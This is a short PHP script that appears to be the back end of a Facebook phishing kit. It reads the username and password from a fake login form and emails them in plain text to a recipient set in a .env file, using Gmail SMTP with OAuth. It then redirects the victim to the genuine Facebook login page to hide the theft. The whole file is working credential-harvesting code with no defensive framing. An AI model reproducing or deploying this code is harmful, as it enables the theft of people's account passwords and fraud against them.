<?php
require 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\OAuth;
use League\OAuth2\Client\Provider\Google;
use Dotenv\Dotenv;

// Load environment variables
$dotenv = Dotenv::createImmutable(__DIR__);
$dotenv->load();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['inputUsername']);
    $password = htmlspecialchars($_POST['inputPassword']);

    // Gmail OAuth 2.0 Credentials from .env
    $clientId = $_ENV['GOOGLE_CLIENT_ID'];
    $clientSecret = $_ENV['GOOGLE_CLIENT_SECRET'];
    $refreshToken = $_ENV['GOOGLE_REFRESH_TOKEN'];
    $email = $_ENV['GMAIL_ACCOUNT'];
    $recipientEmail = $_ENV['RECIPIENT_EMAIL'];
    $recipientName = $_ENV['RECIPIENT_NAME'];

    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->AuthType   = 'XOAUTH2';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = 587;

        // OAuth 2.0 Configuration
        $mail->setOAuth(new OAuth([
            'provider' => new Google([
                'clientId'     => $clientId,
                'clientSecret' => $clientSecret,
            ]),
            'clientId'     => $clientId,
            'clientSecret' => $clientSecret,
            'refreshToken' => $refreshToken,
            'userName'     => $email,
        ]));

        // Email sender and recipient
        $mail->setFrom($email, 'Form Login');
        $mail->addAddress($recipientEmail, $recipientName);

        // Email content
        $mail->isHTML(false);
        $mail->Subject = 'Data Login Form';
        $mail->Body    = "Data Login:\n\nUsername/Email: $username\nPassword: $password";

        // Send the email
        $mail->send();

        // Redirect to Facebook login page after success
        header('Location: https://www.facebook.com/login');
        exit;
    } catch (Exception $e) {
        echo "Form failed to send. Error: {$mail->ErrorInfo}";
    }
} else {
    echo "Invalid access.";
}
